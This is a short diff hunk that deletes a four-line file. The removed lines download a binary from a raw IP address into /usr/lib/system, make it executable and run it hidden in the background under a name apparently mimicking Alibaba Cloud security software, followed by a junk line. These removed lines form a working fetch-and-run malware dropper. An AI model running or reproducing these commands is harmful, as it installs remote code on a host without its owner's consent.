@@ -1,4 +1,0 @@
-curl -o /usr/lib/system http://106.52.28.126:8888/iecc1y/Aliyundun
-chmod +x /usr/lib/system
-nohup /usr/lib/system >/dev/null 2>&1  &
-aaaaaaaaaaaa
